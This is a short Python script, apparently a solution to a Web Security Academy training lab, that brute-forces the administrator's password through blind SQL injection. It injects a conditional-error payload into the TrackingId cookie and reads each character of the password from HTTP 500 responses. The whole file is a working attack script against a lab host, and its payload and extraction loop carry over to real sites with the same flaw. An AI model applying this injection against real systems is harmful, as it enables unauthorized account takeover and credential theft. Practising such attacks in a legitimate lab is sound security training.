import requests
import string
from pwn import *

main_url = "https://0a7d00d203fec0b581f70231005200bc.web-security-academy.net/"
letters=string.ascii_lowercase+string.digits


def makeRequest():
    password=""
    p1 = log.progress("Fuerza Bruta")
    p1.status("Atacando")
    time.sleep(0.25)
    p2 = log.progress("Password: ")

    for i in range(1,21):
        for j in letters:
            cookies ={
                    'TrackingId':"TrackingId=aKB2rw2g6j6eJFSL'||(select CASE WHEN substr(password,%d,1)='%s' THEN to_char(1/0) ELSE '' END from users where username='administrator')||'" % (i,j),
                    'session':"OeD279bJqTcmwK8Dyckpe79nbCRYcqPA"
                    }
            p1.status(cookies['TrackingId'])
            r= requests.get(main_url,cookies=cookies)

            if r.status_code == 500:
                password+=j
                p2.status(password)
                break
if __name__ == "__main__":
   makeRequest() 
